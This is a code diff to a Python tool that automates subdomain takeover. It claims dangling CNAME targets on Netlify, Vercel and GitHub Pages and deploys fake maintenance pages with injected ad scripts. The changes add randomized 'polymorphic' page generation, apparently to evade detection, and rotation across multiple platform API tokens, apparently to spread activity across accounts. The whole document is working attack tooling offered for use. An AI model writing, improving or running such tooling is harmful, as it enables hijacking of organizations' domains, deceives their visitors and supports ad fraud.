@@ -5,23 +5,91 @@ import zipfile
 import io
 import base64
 import time
+import random
 
-NETLIFY_TOKEN = os.environ.get('NETLIFY_TOKEN')
-VERCEL_TOKEN = os.environ.get('VERCEL_TOKEN')
+# Split the comma-separated strings into lists for rotation
+NETLIFY_TOKENS = os.environ.get('NETLIFY_TOKEN', '').split(',')
+VERCEL_TOKENS = os.environ.get('VERCEL_TOKEN', '').split(',')
 GH_TOKEN = os.environ.get('GH_ORG_TOKEN')
 DB_NAME = 'harvested.db'
+
+# --- POLYMORPHIC HTML GENERATOR ---
+def generate_polymorphic_html():
+    # Randomized CSS styles
+    bg_colors = ['#0d1117', '#1a1a2e', '#f4f4f9', '#222222', '#0f172a']
+    text_colors = ['#58a6ff', '#e94560', '#00d2d3', '#fbbf24', '#8b949e']
+    fonts = ['Arial, sans-serif', 'Helvetica, sans-serif', 'Segoe UI, sans-serif', 'Roboto, sans-serif']
+    
+    # Randomized Copy
+    titles = ["We'll be right back.", "Maintenance in Progress", "Under Construction", "We are upgrading.", "Be right back."]
+    messages = [
+        "Our platform is undergoing scheduled upgrades to improve performance.",
+        "We're doing some quick maintenance. Thank you for your patience.",
+        "Our systems are being updated. Check back soon.",
+        "We'll be back online shortly. Thanks for visiting!"
+    ]
+    
+    # Randomized Ad Tags (Replace these with your real ad tags later)
+    ad_tags = [
+        '',
+        '<script src="https://propellerads.com/fake-tag-1.js"></script>',
+        '<script src="https://adsterra.com/fake-tag-2.js"></script>'
+    ]
+
+    bg = random.choice(bg_colors)
+    txt = random.choice(text_colors)
+    font = random.choice(fonts)
+    title = random.choice(titles)
+    msg = random.choice(messages)
+    ad = random.choice(ad_tags)
+
+    # Build the HTML
+    html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="{msg}">
+    <title>{title}</title>
+    <style>
+        body {{ font-family: {font}; background: {bg}; color: {txt}; text-align: center; padding-top: 15%; }}
+        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
+        h1 {{ font-size: 36px; margin-bottom: 20px; }}
+        p {{ font-size: 16px; opacity: 0.8; line-height: 1.5; }}
+        .spinner {{ border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid {txt}; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }}
+        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>{title}</h1>
+        <p>{msg}</p>
+        <div class="spinner"></div>
+        <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
+    </div>
+    {ad}
+</body>
+</html>"""
+    return html
 
 # --- NETLIFY DEPLOYMENT ---
 def deploy_to_netlify(subdomain, cname_target):
     if '.netlify.app' not in cname_target:
         return False
+    
+    # Randomly select a token from our list
+    if not NETLIFY_TOKENS or NETLIFY_TOKENS == ['']:
+        print("[-] No Netlify tokens found.")
+        return False
+    token = random.choice(NETLIFY_TOKENS)
         
     base_name = cname_target.split('.netlify.app')[0]
     site_name = base_name.replace('.', '-')
     
-    headers = {'Authorization': f'Bearer {NETLIFY_TOKEN}'}
+    headers = {'Authorization': f'Bearer {token}'}
 
-    print(f"[*] Creating Netlify site: {site_name}")
+    print(f"[*] Creating Netlify site: {site_name} (Using token ending in ...{token[-4:]})")
     site_url = "https://api.netlify.com/api/v1/sites"
     site_payload = {'name': site_name}
     
@@ -37,15 +105,14 @@ def deploy_to_netlify(subdomain, cname_target):
         print("[*] Building deployment payload...")
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
-            with open('template.html', 'r', encoding='utf-8') as f:
-                file_content = f.read()
+            file_content = generate_polymorphic_html()
             zip_file.writestr('index.html', file_content)
         zip_buffer.seek(0)
 
         print("[*] Deploying payload...")
         deploy_url = f"https://api.netlify.com/api/v1/sites/{site_id}/deploys"
         deploy_headers = {
-            'Authorization': f'Bearer {NETLIFY_TOKEN}',
+            'Authorization': f'Bearer {token}',
             'Content-Type': 'application/zip'
         }
         
@@ -65,15 +132,21 @@ def deploy_to_vercel(subdomain, cname_target):
     if '.vercel.app' not in cname_target:
         return False
 
+    # Randomly select a token from our list
+    if not VERCEL_TOKENS or VERCEL_TOKENS == ['']:
+        print("[-] No Vercel tokens found.")
+        return False
+    token = random.choice(VERCEL_TOKENS)
+
     base_name = cname_target.split('.vercel.app')[0]
     project_name = base_name.replace('.', '-')
 
     headers = {
-        'Authorization': f'Bearer {VERCEL_TOKEN}',
+        'Authorization': f'Bearer {token}',
         'Content-Type': 'application/json'
     }
 
-    print(f"[*] Creating Vercel project: {project_name}")
+    print(f"[*] Creating Vercel project: {project_name} (Using token ending in ...{token[-4:]})")
     project_url = "https://api.vercel.com/v10/projects"
     project_payload = {'name': project_name}
     
@@ -88,15 +161,14 @@ def deploy_to_vercel(subdomain, cname_target):
         print("[*] Building deployment payload...")
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
-            with open('template.html', 'r', encoding='utf-8') as f:
-                file_content = f.read()
+            file_content = generate_polymorphic_html()
             zip_file.writestr('index.html', file_content)
         zip_buffer.seek(0)
 
         print("[*] Deploying payload to Vercel...")
         deploy_url = "https://api.vercel.com/v13/deployments"
         deploy_headers = {
-            'Authorization': f'Bearer {VERCEL_TOKEN}',
+            'Authorization': f'Bearer {token}',
             'Content-Type': 'application/zip'
         }
         params = {'name': project_name, 'target': 'production'}
@@ -117,8 +189,6 @@ def deploy_to_github(subdomain, cname_target):
     if '.github.io' not in cname_target:
         return False
         
-    # e.g., app.startup.github.io -> target user/org is "app-startup" wait no.
-    # DNS for github pages usually points directly to: username.github.io
     target_org = cname_target.split('.github.io')[0]
     repo_name = f"{target_org}.github.io"
     
@@ -133,7 +203,6 @@ def deploy_to_github(subdomain, cname_target):
     
     try:
         org_res = requests.post(org_url, headers=headers, json=org_payload)
-        # 201 = Created, 422 = Already exists
         if org_res.status_code not in [201, 422]:
             print(f"[-] Failed to create Org {target_org}: {org_res.text}")
             return False
@@ -149,9 +218,9 @@ def deploy_to_github(subdomain, cname_target):
             print(f"[-] Failed to create Repo: {repo_res.text}")
             return False
 
-        print("[*] Uploading index.html via Contents API...")
-        with open('template.html', 'r', encoding='utf-8') as f:
-            content_base64 = base64.b64encode(f.read().encode('utf-8')).decode('utf-8')
+        print("[*] Uploading polymorphic index.html via Contents API...")
+        html_content = generate_polymorphic_html()
+        content_base64 = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
             
         file_url = f"https://api.github.com/repos/{target_org}/{repo_name}/contents/index.html"
         file_payload = {
@@ -186,7 +255,7 @@ def deploy_to_github(subdomain, cname_target):
 
 # --- MAIN ROUTER ---
 def main():
-    if not NETLIFY_TOKEN and not VERCEL_TOKEN and not GH_TOKEN:
+    if not NETLIFY_TOKENS and not VERCEL_TOKENS and not GH_TOKEN:
         print("[-] No API tokens found.")
         return
 
@@ -204,9 +273,9 @@ def main():
         subdomain = target[0]
         cname_target = target[1]
         
-        if '.netlify.app' in cname_target and NETLIFY_TOKEN:
+        if '.netlify.app' in cname_target and NETLIFY_TOKENS:
             success = deploy_to_netlify(subdomain, cname_target)
-        elif '.vercel.app' in cname_target and VERCEL_TOKEN:
+        elif '.vercel.app' in cname_target and VERCEL_TOKENS:
             success = deploy_to_vercel(subdomain, cname_target)
         elif '.github.io' in cname_target and GH_TOKEN:
             success = deploy_to_github(subdomain, cname_target)
